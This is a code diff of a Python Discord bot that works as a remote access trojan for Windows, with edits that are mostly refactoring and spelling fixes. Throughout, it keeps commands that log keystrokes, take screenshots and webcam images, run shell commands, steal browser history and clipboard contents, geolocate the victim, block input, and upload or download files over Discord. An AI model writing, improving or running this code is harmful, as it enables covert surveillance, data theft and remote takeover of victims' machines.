@@ -82,17 +82,17 @@ async def on_ready():
         flag = data['country_code']
         ip = data['IPv4']
     import os
-    total = []
+    on_ready.total = []
     global number
     number = 0
     global channel_name
     channel_name = None
     for x in client.get_all_channels(): # From here we look through all the channels,check for the biggest number and then add one to it
-        total.append(x.name)
-    for y in range(len(total)): #Probably a better way to do this
-        if "session" in total[y]:
+        (on_ready.total).append(x.name)
+    for y in range(len(on_ready.total)): #Probably a better way to do this
+        if "session" in on_ready.total[y]:
             import re
-            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
+            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
             biggest = max(map(int, result))
             number = biggest + 1
         else:
@@ -134,32 +134,31 @@ async def on_message(message):
         pass
     else:
         if message.content.startswith("!kill"):
-            try:
-                if message.content[6:] == "all":
-                    for y in range(len(total)): #Probably a better way to do this
-                        if "session" in total[y]:
-                            channel_to_delete = discord.utils.get(client.get_all_channels(), name=total[y])
-                            await channel_to_delete.delete()
-                        else:
-                            pass
-                else:
+            if message.content[6:] == "all":
+                for y in range(len(on_ready.total)): #Probably a better way to do this
+                    if "session" in on_ready.total[y]:
+                        channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
+                        await channel_to_delete.delete()
+                    else:
+                        pass
+            else:
+                try:
                     channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                     await channel_to_delete.delete()
                     await message.channel.send(f"[*] {message.content[6:]} killed.")
-            except:
-                await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")
+                except:
+                    await message.channel.send(f"[!] {message.content[6:]} is invalid,please enter a valid session name")
 
         if message.content == "!dumpkeylogger":
             import os
             temp = os.getenv("TEMP")
-            file_keys = f"temp {key_log.txt}"
+            file_keys = os.path.join(os.getenv('TEMP') + "\\key_log.txt")
             file = discord.File(file_keys, filename=file_keys)
-            await message.channel.send("[*] Command successfuly executed", file=file)
-            os.popen(f"del {file_keys}")
+            await message.channel.send("[*] Command successfully executed", file=file)
+            os.remove(os.path.join(os.getenv('TEMP') + "\\key_log.txt"))
 
         if message.content == "!exit":
-            import sys
-            sys.exit()
+            exit()
 
         if message.content == "!windowstart":
             import threading
@@ -182,7 +181,7 @@ async def on_message(message):
             with mss() as sct:
                 sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
             file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
-            await message.channel.send("[*] Command successfuly executed", file=file)
+            await message.channel.send("[*] Command successfully executed", file=file)
             os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))
 
         if message.content == "!volumemax":
@@ -205,7 +204,7 @@ async def on_message(message):
                     zipObj.extractall()
                 os.system("WebCamImageSave.exe /capture /FileName temp.png")
                 file = discord.File("temp.png", filename="temp.png")
-                await message.channel.send("[*] Command successfuly executed", file=file)
+                await message.channel.send("[*] Command successfully executed", file=file)
                 os.remove("temp.zip")
                 os.remove("temp.png")
                 os.remove("WebCamImageSave.exe")
@@ -230,21 +229,13 @@ async def on_message(message):
             messa.start()
             import win32con
             import win32gui
-            def get_all_hwnd(hwnd,mouse): #Here define a statement looking through all visible windows titles find our message box then get the handle and show it in the foreground
-                def winEnumHandler(hwnd, ctx):
-                    if win32gui.IsWindowVisible(hwnd):
-                        print(win32gui.GetWindowText(hwnd))
-                    if win32gui.GetWindowText(hwnd) == "Error":
-                        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
-                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
-                        win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
-                        win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
-                        return None
-                    else:
-                        pass
-                if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
-                    win32gui.EnumWindows(winEnumHandler,None)
-            win32gui.EnumWindows(get_all_hwnd, 0)
+            import time
+            time.sleep(1)
+            hwnd = win32gui.FindWindow(None, "Error")
+            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+            win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
+            win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
+            win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
 
         if message.content.startswith("!wallpaper"):
             import ctypes
@@ -252,11 +243,11 @@ async def on_message(message):
             path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
             await message.attachments[0].save(path)
             ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
-            await message.channel.send("[*] Command successfuly executed")
+            await message.channel.send("[*] Command successfully executed")
 
         if message.content.startswith("!upload"):
             await message.attachments[0].save(message.content[8:])
-            await message.channel.send("[*] Command successfuly executed")
+            await message.channel.send("[*] Command successfully executed")
 
         if message.content.startswith("!shell"):
             global status
@@ -288,22 +279,22 @@ async def on_message(message):
                     f1.write(result)
                     f1.close()
                     file = discord.File("output.txt", filename="output.txt")
-                    await message.channel.send("[*] Command successfuly executed", file=file)
+                    await message.channel.send("[*] Command successfully executed", file=file)
                     os.popen("del output.txt")
                 else:
-                    await message.channel.send("[*] Command successfuly executed : " + result)
+                    await message.channel.send("[*] Command successfully executed : " + result)
             else:
                 await message.channel.send("[*] Command not recognized or no output was obtained")
                 status = None
 
         if message.content.startswith("!download"):
             file = discord.File(message.content[10:], filename=message.content[10:])
-            await message.channel.send("[*] Command successfuly executed", file=file)
+            await message.channel.send("[*] Command successfully executed", file=file)
 
         if message.content.startswith("!cd"):
             import os
             os.chdir(message.content[4:])
-            await message.channel.send("[*] Command successfuly executed")
+            await message.channel.send("[*] Command successfully executed")
 
         if message.content == "!help":
             await message.channel.send(helpmenu)
@@ -320,12 +311,11 @@ async def on_message(message):
             import browserhistory as bh
             dict_obj = bh.get_browserhistory()
             strobj = str(dict_obj).encode(errors='ignore')
-            f3 = open('history.txt', 'a')
-            f3.write(str(strobj))
-            f3.close()
+            with open("history.txt","a") as hist:
+                hist.write(str(strobj))
             file = discord.File("history.txt", filename="history.txt")
-            await message.channel.send("[*] Command successfuly executed", file=file)
-            os.popen("del history.txt")
+            await message.channel.send("[*] Command successfully executed", file=file)
+            os.remove("history.txt")
 
         if message.content == "!clipboard":
             import ctypes
@@ -346,7 +336,7 @@ async def on_message(message):
                 kernel32.GlobalUnlock(data_locked)
                 body = value.decode()
                 user32.CloseClipboard()
-                await message.channel.send("[*] Command successfuly executed : " + "Clipboard content is : " + str(body))
+                await message.channel.send(f"[*] Clipboard content is : {body}")
 
         if message.content.startswith("!stopsing"):
             import os 
@@ -356,12 +346,11 @@ async def on_message(message):
 
         if message.content == "!sysinfo":
             import platform
-            jak = str(platform.uname())
-            intro = jak[12:]
+            info = platform.uname()
+            info_total = f'{info.system} {info.release} {info.machine}'
             from requests import get
             ip = get('https://api.ipify.org').text
-            pp = "IP Adress = " + ip
-            await message.channel.send("[*] Command successfuly executed : " + intro + pp)
+            await message.channel.send(f"[*] Command successfully executed : {info_total} {ip}")
 
         if message.content == "!geolocate":
             import urllib.request
@@ -369,7 +358,7 @@ async def on_message(message):
             with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                 data = json.loads(url.read().decode())
                 link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
-                await message.channel.send("[*] Command successfuly executed : " + link)
+                await message.channel.send("[*] Command successfully executed : " + link)
 
         if message.content == "!admincheck":
             import ctypes
@@ -483,8 +472,7 @@ async def on_message(message):
             from pynput.keyboard import Key, Listener
             import logging
             temp = os.getenv("TEMP")
-            log_dir = temp
-            logging.basicConfig(filename=(log_dir + "key_log.txt"),
+            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                                 level=logging.DEBUG, format='%(asctime)s: %(message)s')
             def keylog():
                 def on_press(key):
@@ -497,12 +485,12 @@ async def on_message(message):
             test._running = True
             test.daemon = True
             test.start()
-            await message.channel.send("[*] Keylogger successfuly started")
+            await message.channel.send("[*] Keylogger successfully started")
 
         if message.content == "!stopkeylogger":
             import os
             test._running = False
-            await message.channel.send("[*] Keylogger successfuly stopped")
+            await message.channel.send("[*] Keylogger successfully stopped")
 
         if message.content == "!idletime":
             class LASTINPUTINFO(Structure):
@@ -536,14 +524,14 @@ async def on_message(message):
             speak = wincl.Dispatch("SAPI.SpVoice")
             speak.Speak(message.content[7:])
             comtypes.CoUninitialize()
-            await  message.channel.send("[*] Command successfuly executed")
+            await  message.channel.send("[*] Command successfully executed")
 
         if message.content.startswith("!blockinput"):
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 ok = windll.user32.BlockInput(True)
-                await message.channel.send("[*] Command successfuly executed")
+                await message.channel.send("[*] Command successfully executed")
             else:
                 await message.channel.send("[!] Admin rights are required for this operation")
 
@@ -552,7 +540,7 @@ async def on_message(message):
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 ok = windll.user32.BlockInput(False)
-                await  message.channel.send("[*] Command successfuly executed")
+                await  message.channel.send("[*] Command successfully executed")
             else:
                 await message.channel.send("[!] Admin rights are required for this operation")
 
